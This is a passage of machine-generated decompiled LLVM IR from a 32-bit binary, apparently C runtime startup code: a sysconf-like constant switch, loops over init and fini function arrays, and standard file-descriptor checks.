    i32 149, label %dec_label_pc_8051ae6
  ]

dec_label_pc_8051a33:                             ; preds = %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051a3d:                             ; preds = %dec_label_pc_8051a1e
  %v1_8051a3d = call i32 @function_805021b(i32 ptrtoint (i32* @0 to i32))
  %v1_8051a42 = inttoptr i32 %v1_8051a3d to i32*
  store i32 22, i32* %v1_8051a42, align 4
  br label %dec_label_pc_8051b32

dec_label_pc_8051a4d:                             ; preds = %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051a57:                             ; preds = %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051a61:                             ; preds = %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051a6b:                             ; preds = %dec_label_pc_8051a1e
  %v0_8051a6e = call i32 @function_8052169()
  br label %dec_label_pc_8051a73

dec_label_pc_8051a73:                             ; preds = %dec_label_pc_8051a1e, %dec_label_pc_8051a6b
  br label %dec_label_pc_8051b5f

dec_label_pc_8051a7d:                             ; preds = %dec_label_pc_8051a1e
  %v0_8051a80 = call i32 @function_8052200()
  br label %dec_label_pc_8051a85

dec_label_pc_8051a85:                             ; preds = %dec_label_pc_8051a1e, %dec_label_pc_8051a7d
  br label %dec_label_pc_8051b5f

dec_label_pc_8051a8f:                             ; preds = %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051a99:                             ; preds = %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051aa3:                             ; preds = %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051aad:                             ; preds = %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051ab7:                             ; preds = %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051ac1:                             ; preds = %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051acb:                             ; preds = %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051ad5:                             ; preds = %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051adf:                             ; preds = %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051ae6:                             ; preds = %dec_label_pc_8051a1e
  %v5_8051aec = call i32 @function_8051f6c(i32 1, %timespec* null, i32 149, i32 149)
  %v2_8051af4 = icmp slt i32 %v5_8051aec, 0
  %v1_8051af6 = icmp eq i1 %v2_8051af4, false
  br i1 %v1_8051af6, label %dec_label_pc_8051b08, label %dec_label_pc_8051b32

dec_label_pc_8051afa:                             ; preds = %dec_label_pc_8051a1e, %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051b01:                             ; preds = %dec_label_pc_8051a1e, %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051b08:                             ; preds = %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051ae6
  br label %dec_label_pc_8051b5f

dec_label_pc_8051b0f:                             ; preds = %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051b16:                             ; preds = %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051b1d:                             ; preds = %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051b24:                             ; preds = %dec_label_pc_8051a1e, %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051b2b:                             ; preds = %dec_label_pc_8051a1e, %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051b32:                             ; preds = %dec_label_pc_8051ae6, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a3d
  br label %dec_label_pc_8051b5f

dec_label_pc_8051b37:                             ; preds = %dec_label_pc_8051a1e, %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051b3e:                             ; preds = %dec_label_pc_8051a1e, %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051b45:                             ; preds = %dec_label_pc_8051a1e, %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051b4c:                             ; preds = %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051b53:                             ; preds = %dec_label_pc_8051a1e, %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051b5a:                             ; preds = %dec_label_pc_8051a1e, %dec_label_pc_8051a1e, %dec_label_pc_8051a1e
  br label %dec_label_pc_8051b5f

dec_label_pc_8051b5f:                             ; preds = %dec_label_pc_8051b53, %dec_label_pc_8051b4c, %dec_label_pc_8051b45, %dec_label_pc_8051b3e, %dec_label_pc_8051b37, %dec_label_pc_8051b2b, %dec_label_pc_8051b24, %dec_label_pc_8051b1d, %dec_label_pc_8051b16, %dec_label_pc_8051b0f, %dec_label_pc_8051b01, %dec_label_pc_8051afa, %dec_label_pc_8051b08, %dec_label_pc_8051adf, %dec_label_pc_8051ad5, %dec_label_pc_8051acb, %dec_label_pc_8051ac1, %dec_label_pc_8051ab7, %dec_label_pc_8051aad, %dec_label_pc_8051aa3, %dec_label_pc_8051a99, %dec_label_pc_8051a8f, %dec_label_pc_8051a85, %dec_label_pc_8051a73, %dec_label_pc_8051a61, %dec_label_pc_8051a57, %dec_label_pc_8051a4d, %dec_label_pc_8051a33, %dec_label_pc_8051b32, %dec_label_pc_8051b5a
  %v0_8051b62 = phi i32 [ 255, %dec_label_pc_8051b53 ], [ 2048, %dec_label_pc_8051b4c ], [ 99, %dec_label_pc_8051b45 ], [ 20, %dec_label_pc_8051b3e ], [ -128, %dec_label_pc_8051b37 ], [ 1024, %dec_label_pc_8051b2b ], [ 4, %dec_label_pc_8051b24 ], [ 32, %dec_label_pc_8051b1d ], [ 256, %dec_label_pc_8051b16 ], [ 2147483647, %dec_label_pc_8051b0f ], [ 16, %dec_label_pc_8051b01 ], [ 127, %dec_label_pc_8051afa ], [ 200112, %dec_label_pc_8051b08 ], [ 9, %dec_label_pc_8051adf ], [ 65535, %dec_label_pc_8051ad5 ], [ -32768, %dec_label_pc_8051acb ], [ -2147483648, %dec_label_pc_8051ac1 ], [ 8, %dec_label_pc_8051ab7 ], [ 500, %dec_label_pc_8051aad ], [ 4096, %dec_label_pc_8051aa3 ], [ 16384, %dec_label_pc_8051a99 ], [ 1000, %dec_label_pc_8051a8f ], [ 32768, %dec_label_pc_8051a85 ], [ 6, %dec_label_pc_8051a73 ], [ 65536, %dec_label_pc_8051a61 ], [ 100, %dec_label_pc_8051a57 ], [ 131072, %dec_label_pc_8051a4d ], [ 1, %dec_label_pc_8051a33 ], [ -1, %dec_label_pc_8051b32 ], [ 32767, %dec_label_pc_8051b5a ]
  ret i32 %v0_8051b62

; uselistorder directives
  uselistorder i32 65536, { 28, 29, 3, 4, 5, 6, 7, 8, 10, 9, 11, 13, 14, 12, 15, 17, 16, 18, 1, 19, 0, 2, 22, 20, 23, 21, 26, 24, 25, 27 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 22, 23, 3, 4, 16, 17, 20, 21, 14, 15, 18, 19, 1, 2, 12, 13, 24, 25, 26, 27 }
  uselistorder i32 65535, { 2, 0, 1 }
  uselistorder i32 2048, { 2, 1, 0 }
  uselistorder i32 255, { 0, 2, 3, 4, 1 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 127, { 0, 2, 1 }
  uselistorder i32 107, { 1, 0 }
  uselistorder i32 96, { 1, 0 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 94, { 1, 0 }
  uselistorder i32 90, { 1, 0 }
  uselistorder i32 86, { 1, 0 }
  uselistorder i32 83, { 1, 0 }
  uselistorder i32 63, { 1, 0, 2 }
  uselistorder i32 60, { 1, 0 }
  uselistorder i32 46, { 1, 0 }
  uselistorder i32 42, { 1, 0 }
  uselistorder i32 37, { 1, 0 }
  uselistorder i32 34, { 2, 0, 1 }
  uselistorder i32 27, { 2, 1, 0 }
  uselistorder i32 17, { 1, 0 }
  uselistorder i32 9, { 2, 4, 0, 1, 3, 6, 11, 7, 8, 9, 10, 5, 12 }
  uselistorder i32 6, { 0, 5, 2, 3, 1, 7, 4, 8, 9, 10, 11, 6 }
  uselistorder i32 5, { 4, 0, 6, 7, 3, 8, 5, 2, 1 }
  uselistorder label %dec_label_pc_8051b5f, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_8051b32, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8051b08, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8051a85, { 1, 0 }
  uselistorder label %dec_label_pc_8051a73, { 1, 0 }
}

define i32 @function_8051b63() local_unnamed_addr {
dec_label_pc_8051b63:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051b63 = load i32, i32* @ebx, align 4
  store i32 %v0_8051b63, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32 -134557696), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32 -134557696), i32 2), i32 0), label %dec_label_pc_8051b77, label %dec_label_pc_8051b84

dec_label_pc_8051b77:                             ; preds = %dec_label_pc_8051b63, %dec_label_pc_8051b77
  %v1_8051b7e6 = phi i32 [ %v1_8051b7e, %dec_label_pc_8051b77 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32 -134557696), i32 2), i32 -1), %dec_label_pc_8051b63 ]
  store i32 ptrtoint (i32* @global_var_8051b7e.58 to i32), i32* %stack_var_-16, align 4
  %v5_8051b77 = mul i32 %v1_8051b7e6, 4
  %v6_8051b77 = add i32 %v5_8051b77, ptrtoint (i32* @global_var_8053000.57 to i32)
  %v7_8051b77 = inttoptr i32 %v6_8051b77 to i32*
  %v8_8051b77 = load i32, i32* %v7_8051b77, align 4
  call void @__pseudo_call(i32 %v8_8051b77)
  %v0_8051b7e.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051b7e = add i32 %v0_8051b7e.pre, -1
  store i32 %v1_8051b7e, i32* %ebx.global-to-local, align 4
  %v10_8051b7f = icmp eq i32 %v0_8051b7e.pre, 0
  %v1_8051b82 = icmp eq i1 %v10_8051b7f, false
  br i1 %v1_8051b82, label %dec_label_pc_8051b77, label %dec_label_pc_8051b84

dec_label_pc_8051b84:                             ; preds = %dec_label_pc_8051b77, %dec_label_pc_8051b63
  %v0_8051b84 = load i32, i32* @global_var_8053148.59, align 8
  %v1_8051b89 = icmp eq i32 %v0_8051b84, 0
  br i1 %v1_8051b89, label %dec_label_pc_8051b8f, label %dec_label_pc_8051b8d

dec_label_pc_8051b8d:                             ; preds = %dec_label_pc_8051b84
  %v0_8051b8d = load i32, i32* %stack_var_-16, align 4
  %v1_8051b8d = call i32 @unknown_0(i32 %v0_8051b8d)
  br label %dec_label_pc_8051b8f

dec_label_pc_8051b8f:                             ; preds = %dec_label_pc_8051b8d, %dec_label_pc_8051b84
  %v0_8051b8f = load i32, i32* @global_var_805314c.60, align 4
  store i32 %v0_8051b8f, i32* @ecx, align 4
  %v1_8051b95 = icmp eq i32 %v0_8051b8f, 0
  br i1 %v1_8051b95, label %dec_label_pc_8051b9e, label %dec_label_pc_8051b99

dec_label_pc_8051b99:                             ; preds = %dec_label_pc_8051b8f
  %v2_8051b9b = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051b9b, i32* %ebx.global-to-local, align 4
  %v0_8051b9c = load i32, i32* %stack_var_-16, align 4
  %v1_8051b9c = call i32 @unknown_0(i32 %v0_8051b9c)
  br label %dec_label_pc_8051b9e

dec_label_pc_8051b9e:                             ; preds = %dec_label_pc_8051b8f, %dec_label_pc_8051b99
  %v2_8051b9e = load i32, i32* %stack_var_-16, align 4
  %v2_8051b9f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051b9f, i32* @edx, align 4
  ret i32 %v2_8051b9e

; uselistorder directives
  uselistorder i32 %v1_8051b7e, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8051b9e, { 1, 0 }
  uselistorder label %dec_label_pc_8051b77, { 1, 0 }
}

define i32 @function_8051ba2(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051ba2:
  ret i32 0
}

define i32 @function_8051ba5(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051ba5:
  %v0_8051ba5 = load i32, i32* @eax, align 4
  ret i32 %v0_8051ba5
}

define i32 @function_8051ba6() local_unnamed_addr {
dec_label_pc_8051ba6:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v0_8051ba6 = load i32, i32* @esi, align 4
  %v0_8051ba7 = load i32, i32* @ebx, align 4
  %v0_8051bab = load i32, i32* @eax, align 4
  store i32 %v0_8051bab, i32* @esi, align 4
  %v0_8051bad = load i32, i32* @edx, align 4
  store i32 %v0_8051bad, i32* @ebx, align 4
  %v4_8051bb2 = call i32 @function_804fc4d(i32 %v0_8051bab, i32 1, i32 %tmp6)
  %v8_8051bba = icmp eq i32 %v4_8051bb2, -1
  %v1_8051bbb = icmp eq i1 %v8_8051bba, false
  br i1 %v1_8051bbb, label %dec_label_pc_8051bd6, label %dec_label_pc_8051bbd

dec_label_pc_8051bbd:                             ; preds = %dec_label_pc_8051ba6
  %v0_8051bbf = load i32, i32* @ebx, align 4
  %v6_8051bc5 = call i32 @function_804fdf4(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8052a80.61, i32 0, i32 0), i32 %v0_8051bbf)
  %v1_8051bcd = load i32, i32* @esi, align 4
  %v12_8051bcd = icmp eq i32 %v6_8051bc5, %v1_8051bcd
  br i1 %v12_8051bcd, label %dec_label_pc_8051bd6, label %dec_label_pc_8051bd1

dec_label_pc_8051bd1:                             ; preds = %dec_label_pc_8051bbd
  %v0_8051bd1 = call i32 @function_80515da()
  br label %dec_label_pc_8051bd6

dec_label_pc_8051bd6:                             ; preds = %dec_label_pc_8051bbd, %dec_label_pc_8051ba6, %dec_label_pc_8051bd1
  %v2_8051bd6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8051ba7, i32* @ebx, align 4
  store i32 %v0_8051ba6, i32* @esi, align 4
  ret i32 %v2_8051bd6

; uselistorder directives
  uselistorder i32 ()* @function_80515da, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32)* @function_804fdf4, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_804fc4d, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8051bd6, { 2, 0, 1 }
}

define i32 @function_8051bda() local_unnamed_addr {
dec_label_pc_8051bda:
  %v0_8051bdd = load i8, i8* @global_var_8053150.62, align 16
  %v1_8051bdd = icmp eq i8 %v0_8051bdd, 0
  %v1_8051be4 = icmp eq i1 %v1_8051bdd, false
  br i1 %v1_8051be4, label %dec_label_pc_8051bda.dec_label_pc_8051c16_crit_edge, label %dec_label_pc_8051be6

dec_label_pc_8051bda.dec_label_pc_8051c16_crit_edge: ; preds = %dec_label_pc_8051bda
  %v0_8051c19.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051c16

dec_label_pc_8051be6:                             ; preds = %dec_label_pc_8051bda
  store i8 1, i8* @global_var_8053150.62, align 16
  store i32 4096, i32* @global_var_8053144.63, align 4
  br label %dec_label_pc_8051c16

dec_label_pc_8051c16:                             ; preds = %dec_label_pc_8051bda.dec_label_pc_8051c16_crit_edge, %dec_label_pc_8051be6
  %v0_8051c19 = phi i32 [ %v0_8051c19.pre, %dec_label_pc_8051bda.dec_label_pc_8051c16_crit_edge ], [ 0, %dec_label_pc_8051be6 ]
  ret i32 %v0_8051c19

; uselistorder directives
  uselistorder i8 1, { 8, 1, 7, 0, 4, 5, 2, 3, 6 }
  uselistorder i8* @global_var_8053150.62, { 1, 0 }
  uselistorder label %dec_label_pc_8051c16, { 1, 0 }
}

define i32 @function_8051c1a(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8051c1a:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %tmp39 = call i32 @__decompiler_undefined_function_0()
  %tmp44 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %tmp44, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_805313c.64, align 4
  store i32 %arg6, i32* @global_var_805314c.60, align 4
  %v2_8051c51 = mul i32 %arg2, 4
  %v3_8051c51 = add i32 %tmp44, %v2_8051c51
  store i32 %v3_8051c51, i32* %edx.global-to-local, align 4
  %v1_8051c54 = add i32 %v3_8051c51, 4
  store i32 %v1_8051c54, i32* @global_var_8053140.65, align 64
  %v3_8051c5c = load i32, i32* %arg3, align 4
  %v14_8051c5c = icmp eq i32 %v1_8051c54, %v3_8051c5c
  %v1_8051c5e = icmp eq i1 %v14_8051c5c, false
  %v1_8051c54.v3_8051c51 = select i1 %v1_8051c5e, i32 %v1_8051c54, i32 %v3_8051c51
  store i32 %v1_8051c54.v3_8051c51, i32* @global_var_8053140.65, align 64
  %v0_8051c66 = load i32, i32* @ecx, align 4
  store i32 %v0_8051c66, i32* %stack_var_-160, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8051c6b = ptrtoint i32* %stack_var_-136 to i32
  %v3_8051c70 = bitcast i32* %stack_var_-136 to i8*
  %v4_8051c70 = call i32 @function_805026c(i8* %v3_8051c70, i32 0, i32 120)
  %v0_8051c75 = load i32, i32* @global_var_8053140.65, align 64
  br label %dec_label_pc_8051c7d

dec_label_pc_8051c7d:                             ; preds = %dec_label_pc_8051c7d, %dec_label_pc_8051c1a
  %v0_8051c7d = phi i32 [ %v1_8051c80, %dec_label_pc_8051c7d ], [ %v0_8051c75, %dec_label_pc_8051c1a ]
  %v1_8051c7d = inttoptr i32 %v0_8051c7d to i32*
  %v2_8051c7d = load i32, i32* %v1_8051c7d, align 4
  %v3_8051c7d = icmp eq i32 %v2_8051c7d, 0
  %v1_8051c80 = add i32 %v0_8051c7d, 4
  %v1_8051c83 = icmp eq i1 %v3_8051c7d, false
  br i1 %v1_8051c83, label %dec_label_pc_8051c7d, label %dec_label_pc_8051ca4.preheader

dec_label_pc_8051ca4.preheader:                   ; preds = %dec_label_pc_8051c7d
  store i32 %v1_8051c80, i32* @ebx, align 4
  %v1_8051ca422 = inttoptr i32 %v1_8051c80 to i32*
  %v2_8051ca423 = load i32, i32* %v1_8051ca422, align 4
  %v3_8051ca424 = icmp eq i32 %v2_8051ca423, 0
  %v1_8051ca726 = icmp eq i1 %v3_8051ca424, false
  br i1 %v1_8051ca726, label %dec_label_pc_8051c89.lr.ph, label %dec_label_pc_8051ca9

dec_label_pc_8051c89.lr.ph:                       ; preds = %dec_label_pc_8051ca4.preheader
  %v3_8051c69 = ptrtoint i32* %stack_var_-168 to i32
  %v3_8051c94 = add i32 %v3_8051c69, 32
  br label %dec_label_pc_8051c89

dec_label_pc_8051c89:                             ; preds = %dec_label_pc_8051c89.lr.ph, %dec_label_pc_8051ca1
  %v1_8051c94 = phi i32 [ %v2_8051ca423, %dec_label_pc_8051c89.lr.ph ], [ %v2_8051ca4, %dec_label_pc_8051ca1 ]
  %v0_8051c93 = phi i32 [ %v1_8051c80, %dec_label_pc_8051c89.lr.ph ], [ %v1_8051ca1, %dec_label_pc_8051ca1 ]
  %v6_8051c8e = icmp ugt i32 %v1_8051c94, 14
  br i1 %v6_8051c8e, label %dec_label_pc_8051ca1, label %dec_label_pc_8051c90

dec_label_pc_8051c90:                             ; preds = %dec_label_pc_8051c89
  %v0_8051c90 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8051c90, i32* %stack_var_-160, align 4
  store i32 %v0_8051c93, i32* %stack_var_-168, align 4
  %v2_8051c94 = mul i32 %v1_8051c94, 8
  %v4_8051c94 = add i32 %v3_8051c94, %v2_8051c94
  %v3_8051c99 = inttoptr i32 %v4_8051c94 to i16*
  %v4_8051c99 = call i32 @function_8052466(i16* %v3_8051c99, i32 %v0_8051c93, i32 8)
  %v0_8051ca1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051ca1

dec_label_pc_8051ca1:                             ; preds = %dec_label_pc_8051c89, %dec_label_pc_8051c90
  %v0_8051ca1 = phi i32 [ %v0_8051c93, %dec_label_pc_8051c89 ], [ %v0_8051ca1.pre, %dec_label_pc_8051c90 ]
  %v1_8051ca1 = add i32 %v0_8051ca1, 8
  store i32 %v1_8051ca1, i32* @ebx, align 4
  %v1_8051ca4 = inttoptr i32 %v1_8051ca1 to i32*
  %v2_8051ca4 = load i32, i32* %v1_8051ca4, align 4
  %v3_8051ca4 = icmp eq i32 %v2_8051ca4, 0
  %v1_8051ca7 = icmp eq i1 %v3_8051ca4, false
  br i1 %v1_8051ca7, label %dec_label_pc_8051c89, label %dec_label_pc_8051ca9

dec_label_pc_8051ca9:                             ; preds = %dec_label_pc_8051ca1, %dec_label_pc_8051ca4.preheader
  store i32 %v2_8051c6b, i32* @eax, align 4
  %v0_8051cad = call i32 @function_8052539()
  store i32 %v0_8051cad, i32* @eax, align 4
  %v0_8051cb2 = call i32 @function_8051bda()
  %v1_8051cbb = icmp eq i32 %tmp39, 0
  %v1_8051cbd = icmp eq i1 %v1_8051cbb, false
  %v1_8051cbf = and i32 %tmp39, -65536
  %v2_8051cbf = or i32 %v1_8051cbf, 4096
  %storemerge = select i1 %v1_8051cbd, i32 %tmp39, i32 %v2_8051cbf
  store i32 %storemerge, i32* @global_var_8053144.63, align 4
  %v13_8051cc8 = icmp eq i32 %tmp38, -1
  %v1_8051ccd = icmp eq i1 %v13_8051cc8, false
  br i1 %v1_8051ccd, label %dec_label_pc_8051cf8, label %dec_label_pc_8051ccf

dec_label_pc_8051ccf:                             ; preds = %dec_label_pc_8051ca9
  %v0_8051ccf = call i32 @function_8052245()
  store i32 %v0_8051ccf, i32* @ebx, align 4
  %v0_8051cd6 = call i32 @function_80521b4()
  %v0_8051cdb = load i32, i32* @ebx, align 4
  %v12_8051cdb = icmp eq i32 %v0_8051cdb, %v0_8051cd6
  %v1_8051cdd = icmp eq i1 %v12_8051cdb, false
  br i1 %v1_8051cdd, label %dec_label_pc_8051d0e, label %dec_label_pc_8051cdf

dec_label_pc_8051cdf:                             ; preds = %dec_label_pc_8051ccf
  %v0_8051cdf = call i32 @function_80521da()
  store i32 %v0_8051cdf, i32* @ebx, align 4
  %v0_8051ce6 = call i32 @function_805218e()
  %v0_8051ceb = load i32, i32* @ebx, align 4
  %v12_8051ceb = icmp eq i32 %v0_8051ceb, %v0_8051ce6
  %v1_8051ced = icmp eq i1 %v12_8051ceb, false
  br i1 %v1_8051ced, label %dec_label_pc_8051d0e, label %dec_label_pc_8051d38

dec_label_pc_8051cf8:                             ; preds = %dec_label_pc_8051ca9
  br label %dec_label_pc_8051d0e

dec_label_pc_8051d0e:                             ; preds = %dec_label_pc_8051cf8, %dec_label_pc_8051cdf, %dec_label_pc_8051ccf
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8051d15 = call i32 @function_8051ba6()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8051d24 = call i32 @function_8051ba6()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8051d33 = call i32 @function_8051ba6()
  br label %dec_label_pc_8051d38

dec_label_pc_8051d38:                             ; preds = %dec_label_pc_8051cdf, %dec_label_pc_8051d0e
  store i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32* %esi.global-to-local, align 4
  %v0_8051d3d = load i32, i32* @edi, align 4
  %v1_8051d3d = inttoptr i32 %v0_8051d3d to i32*
  %v2_8051d3d = load i32, i32* %v1_8051d3d, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32 -134557696), i32* %esi.global-to-local, align 4
  store i32 %v2_8051d3d, i32* inttoptr (i32 134557828 to i32*), align 4
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32 -134557696), i32 4), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_8053148.59, align 8
  br i1 icmp ult (i32 add (i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32 -134557693), i32 7), label %dec_label_pc_8051d69, label %dec_label_pc_8051d5d

dec_label_pc_8051d5d:                             ; preds = %dec_label_pc_8051d38, %dec_label_pc_8051d5d
  %v4_8051d5d = phi i32 [ %v1_8051d64, %dec_label_pc_8051d5d ], [ 0, %dec_label_pc_8051d38 ]
  store i32 ptrtoint (i32* @global_var_8051d64.68 to i32), i32* %stack_var_-160, align 4
  %v5_8051d5d = mul i32 %v4_8051d5d, 4
  %v6_8051d5d = add i32 %v5_8051d5d, ptrtoint (i32* @global_var_8053000.57 to i32)
  %v7_8051d5d = inttoptr i32 %v6_8051d5d to i32*
  %v8_8051d5d = load i32, i32* %v7_8051d5d, align 4
  call void @__pseudo_call(i32 %v8_8051d5d)
  %v0_8051d64 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051d64 = add i32 %v0_8051d64, 1
  store i32 %v1_8051d64, i32* %ebx.global-to-local, align 4
  %v1_8051d65 = load i32, i32* %esi.global-to-local, align 4
  %v7_8051d65 = icmp ult i32 %v1_8051d64, %v1_8051d65
  br i1 %v7_8051d65, label %dec_label_pc_8051d5d, label %dec_label_pc_8051d69

dec_label_pc_8051d69:                             ; preds = %dec_label_pc_8051d5d, %dec_label_pc_8051d38
  store i32 134552943, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32 -134557696), i32 2), i32* %esi.global-to-local, align 4
